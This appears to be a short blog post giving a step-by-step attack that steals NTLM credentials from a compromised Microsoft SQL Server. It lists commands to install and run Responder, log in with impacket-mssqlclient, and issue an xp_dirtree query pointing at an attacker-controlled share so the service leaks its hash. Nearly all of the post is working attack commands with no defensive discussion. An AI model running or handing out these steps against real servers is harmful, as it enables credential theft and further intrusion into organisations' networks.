---
layout: post
title: "Steal NTLM Credential Through MSSQL xp_dirtree Query"
date: 2024-01-06 07:00:00 +0700
categories: "Windows-Attack"
---

Installation.
```
git clone https://github.com/lgandx/Responder
cd Responder/
pip3 install -r requirements.txt
```
```
sudo apt install impacket-scripts -y
```

<br/>

Run Responder to log the requests.
```
sudo python3 Responder.py -I eth0
```

<br/>

Login to compromised MSSQL Service with MSSQL Client.
```
sudo impacket-mssqlclient <user>:"<password>"@<target host> -p <port> -debug
```

<br/>

Run the query to steal SMB's cred after Login.
```sql
xp_dirtree '\\<attacker host>\test';
```
